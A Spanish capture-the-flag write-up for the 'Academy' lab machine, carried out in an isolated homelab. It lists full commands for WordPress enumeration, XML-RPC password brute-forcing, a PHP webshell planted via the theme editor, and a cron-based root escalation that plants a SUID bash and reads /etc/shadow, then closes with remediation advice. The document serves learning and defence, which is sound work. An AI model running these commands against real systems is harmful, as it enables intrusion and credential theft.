# Academy — The Hacker Labs

> **Linux (Debian) · Dificultad: Fácil–Media**
> Técnicas: enumeración WordPress · fuerza bruta vía XML-RPC · RCE autenticado por editor de temas · escalada a root por cron + directorio escribible.

Máquina resuelta en homelab VMware aislado. Este write-up **no contiene flags** y omite el valor exacto de las credenciales: prioriza el *porqué* de cada paso.

---

## 0. Resumen

Un servidor web es el único punto de entrada. Dentro vive un WordPress protegido solo por una contraseña débil. La cadena completa:

```
Recon de red → enumeración web → WordPress → fuerza bruta (XML-RPC)
   → admin → RCE (editor de temas) → www-data
   → cron de root ejecuta script ausente en /opt (escribible) → ROOT
```

Lo interesante no es ningún exploit exótico, sino el **encadenamiento de malas prácticas corrientes**: contraseña adivinable + panel que edita código + tarea de root sobre una ruta escribible.

---

## 1. Descubrimiento de red

Partiendo sin conocer la IP, un barrido de la red local identifica hosts vivos. El **OUI de la MAC** distingue la infraestructura de VMware (`00:50:56`) de la VM invitada que es nuestro objetivo (`00:0C:29`):

```bash
sudo nmap -sn -e eth1 192.168.20.0/24 -oN 00-hostdiscovery.nmap
# Nmap scan report for 192.168.20.132
# MAC Address: 00:0C:29:0B:26:1E (VMware)   ← VM invitada = objetivo
```

> 💡 **Lección:** la MAC te dice qué es cada cosa en la red antes incluso de tocar un puerto. ARP no miente.

---

## 2. Enumeración de servicios

Escaneo completo de puertos + detección de versiones:

```bash
sudo nmap -sT -p- --min-rate 2000 192.168.20.132 -oN 01-allports.nmap
sudo nmap -sCV -p22,80 192.168.20.132 -oN 02-services.nmap
```

```
22/tcp open  ssh     OpenSSH 9.2p1 Debian
80/tcp open  http    Apache httpd 2.4.59 (Debian)
```

Solo dos puertos. SSH rara vez es el camino de entrada sin credenciales, así que **el foco es el 80**.

---

## 3. Enumeración web

La raíz muestra la página por defecto de Apache. Fuzzing de directorios:

```bash
gobuster dir -u http://192.168.20.132/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
# /wordpress  (Status: 301)
```

Hay un WordPress. Al inspeccionar las cabeceras (`Link: <...wp-json...>`) aparece un **virtual host**: `academy.thl`. Lo añadimos a `/etc/hosts` para que el sitio cargue correctamente:

```bash
echo "192.168.20.132  academy.thl" | sudo tee -a /etc/hosts
```

> 💡 **Lección:** si una web se comporta raro o enlaza a un dominio que no resuelve, casi siempre es un vhost. `wp-json`, redirecciones y recursos rotos lo delatan.

### WordPress con wpscan

```bash
wpscan --url http://academy.thl/wordpress/ \
       --enumerate p,t,u,cb,dbe --plugins-detection aggressive
```

Resultados relevantes:
- **WordPress 6.5.3** (desactualizado).
- Usuario **`dylan`**.
- Plugin **wp-file-manager 6.5.1** (desactualizado → superficie de RCE conocida, CVE-2020-25213 y familia).
- **XML-RPC habilitado** y listado de directorios activo.

---

## 4. Acceso inicial: fuerza bruta vía XML-RPC

Con un usuario válido y XML-RPC abierto, usamos `system.multicall`, que permite probar **muchas contraseñas por petición** sin límite de intentos — mucho más rápido que el login web:

```bash
wpscan --url http://academy.thl/wordpress/ --usernames dylan \
       --passwords rockyou.txt --password-attack xmlrpc --max-threads 50
# [!] Valid Combinations Found:  dylan / ********   (contraseña del top de rockyou)
```

En segundos obtenemos credenciales de **administrador**. *(Valor omitido para no spoilear.)*

> 💡 **Lección:** `xmlrpc.php` convierte "sin rate-limit" en "miles de intentos/min". Es de lo primero que hay que revisar en un WordPress.

---

## 5. De admin a RCE: editor de temas

WordPress permite a un administrador **editar los PHP del tema** desde el panel. Como Apache ejecuta ese PHP, equivale a ejecución remota de código. Inyectamos una webshell mínima en `functions.php` del tema (vía la acción `edit-theme-plugin-file` de `admin-ajax.php`, usando un *nonce* fresco):

```php
<?php system($_GET['cmd']); ?>
```

```bash
curl -sG "http://academy.thl/wordpress/wp-content/themes/twentytwentytwo/functions.php" \
     --data-urlencode "cmd=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Ya ejecutamos comandos como **`www-data`**.

> ⚠️ Un nonce de WordPress es efímero y específico de la acción: hay que **obtenerlo fresco justo antes** de usarlo, o la petición falla con `nonce_failure`.

---

## 6. Escalada de privilegios a root

Enumerando el sistema como `www-data`, el vector no es evidente a simple vista. En `/opt` hay un `backup.py`… pero esa es la trampa.

### El hallazgo clave

En un escenario real, **`pspy64`** (monitor de procesos sin privilegios) revela qué lanza `root` de verdad:

```bash
# En la víctima:
./pspy64
# ...root ejecuta periódicamente:  /opt/backup.sh
```

El cron de root ejecuta **`/opt/backup.sh`**, no el `backup.py` visible. Y ese `.sh` **no existe**. Pero mira los permisos del directorio:

```bash
ls -la /opt
# drwxr-xr-x  2 www-data root  4096 /opt        ← el dueño de /opt es www-data
```

`/opt` es propiedad de `www-data`, así que **podemos crear el script que falta**. Al siguiente ciclo del cron, `root` ejecutará nuestro código.

### Explotación (sin red: SUID local)

El callback de red target→atacante estaba bloqueado, así que en vez de una reverse shell usamos una técnica **local**: que root nos deje una copia de `bash` con **SUID**. (Importante: `/dev/shm` está montado `noexec`, así que el binario va a `/opt`.)

```bash
# Creamos /opt/backup.sh como www-data (vía la webshell):
cat > /opt/backup.sh <<'EOF'
#!/bin/bash
cp /bin/bash /opt/rootbash
chmod 4755 /opt/rootbash
EOF
chmod 755 /opt/backup.sh
```

Esperamos <1 min a que el cron dispare, y después:

```bash
/opt/rootbash -p -c 'id; cat /etc/shadow | head -1'
# uid=33(www-data) euid=0(root)          ← somos root
# root:$y$j9T$...                         ← lectura de /etc/shadow confirmada
```

**Control total de la máquina.** Ambas flags accesibles (omitidas aquí).

> 💡 **Lección del día:** *nunca asumas qué ejecuta un cron.* Perdí tiempo atacando el `backup.py` visible cuando root ejecutaba `backup.sh`. `pspy64` lo habría mostrado en 30 segundos. **Enumerar supera a suponer.**

---

## 7. Remediación

| # | Problema | Corrección |
|---|---|---|
| 1 | `/opt` escribible por el servicio web | `chown root:root /opt` + `chmod 755`; scripts de cron propiedad de root |
| 2 | Contraseña débil + XML-RPC sin límite | Contraseñas fuertes, 2FA, limitar/bloquear `xmlrpc.php`, Fail2ban |
| 3 | Admin puede editar código | `DISALLOW_FILE_EDIT` en `wp-config.php`; servidor sin escritura sobre su código |
| 4 | Software desactualizado | Actualizar core/plugins; retirar wp-file-manager si no se usa |
| 5 | Fugas de info | Desactivar `Options Indexes`, borrar `readme.html`, ocultar versiones |

**Defensa en profundidad:** ningún fallo por separado da root; su encadenamiento sí. Romper un solo eslabón detiene la cadena entera.

---

## 8. Conclusión

Academy es un recordatorio excelente de que la seguridad real se rompe por **acumulación de descuidos**, no por un único 0-day. El camino premia la enumeración metódica y castiga las suposiciones.
